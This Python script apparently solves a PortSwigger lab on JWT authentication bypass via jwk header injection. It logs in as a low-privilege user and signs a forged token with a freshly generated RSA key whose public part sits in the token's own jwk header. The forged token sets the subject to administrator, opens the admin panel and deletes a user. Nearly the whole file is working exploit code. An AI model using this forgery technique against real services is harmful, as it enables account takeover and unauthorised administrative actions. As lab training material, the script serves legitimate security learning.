"""
Lab 4: JWT authentication bypass via jwk header injection
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
Difficulty: Practitioner

📝 The flaw: the server will verify a token against WHATEVER public key is
embedded in that same token's own "jwk" header — so we just supply our own
keypair and sign with it. There's nothing stopping us from being our own CA.

Requires: pip install pyjwt cryptography --break-system-packages
"""

import json

import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from utils import get_session, log, note, decode_jwt

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def generate_keypair():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return key, key.public_key()


def jwk_from_public_key(pub, kid="evil-kid"):
    """Build the JWK dict PyJWT expects, from a cryptography public key object."""
    numbers = pub.public_numbers()
    def b64(n, length):
        return pyjwt.utils.base64url_encode(n.to_bytes(length, "big")).decode()
    return {
        "kty": "RSA",
        "kid": kid,
        "use": "sig",
        "alg": "RS256",
        "n": b64(numbers.n, (numbers.n.bit_length() + 7) // 8),
        "e": b64(numbers.e, (numbers.e.bit_length() + 7) // 8),
    }


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    _, payload = decode_jwt(token)
    note(f"Original payload: {payload}")

    priv, pub = generate_keypair()
    jwk = jwk_from_public_key(pub)

    payload["sub"] = "administrator"
    header = {"alg": "RS256", "typ": "JWT", "kid": jwk["kid"], "jwk": jwk}

    pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    forged = pyjwt.encode(payload, pem, algorithm="RS256", headers=header)
    log(f"Forged token (self-signed, own jwk embedded): {forged[:60]}...")

    s.cookies.set("session", forged)
    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
